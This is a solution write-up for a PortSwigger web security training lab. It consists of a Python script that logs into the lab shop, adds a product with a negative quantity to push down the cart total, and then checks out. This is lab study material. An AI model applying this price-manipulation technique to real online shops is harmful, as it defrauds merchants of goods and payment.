# Lab: High-level logic vulnerability

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

sess = requests.Session()

# Get login

response = requests.get('https://0abf001a032c108ec073315200130062.web-security-academy.net/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]


# Post login
cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    'https://0abf001a032c108ec073315200130062.web-security-academy.net/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)


# Post item jacket to cart

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

data = {
    'productId': '1',
    'redir': 'PRODUCT',
    'quantity': '1'
}

response = requests.post(
    'https://0abf001a032c108ec073315200130062.web-security-academy.net/cart',
    cookies=cookies,    
    data=data,
    verify=False,
    allow_redirects=False
)

#Post other items to cart

data = {
    'productId': '4',
    'redir': 'PRODUCT',
    'quantity': '-37'
}

response = requests.post(
    'https://0abf001a032c108ec073315200130062.web-security-academy.net/cart',
    cookies=cookies,    
    data=data,
    verify=False,
    allow_redirects=False
)


# Get cart

response = requests.get(
    'https://0abf001a032c108ec073315200130062.web-security-academy.net/cart',
    cookies=cookies,
    verify=False,
    )

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
}

# Post payment
response = requests.post(
    'https://0abf001a032c108ec073315200130062.web-security-academy.net/cart/checkout',
    cookies=cookies,
    data=data,
    verify=False,
    )

print(response.text)
```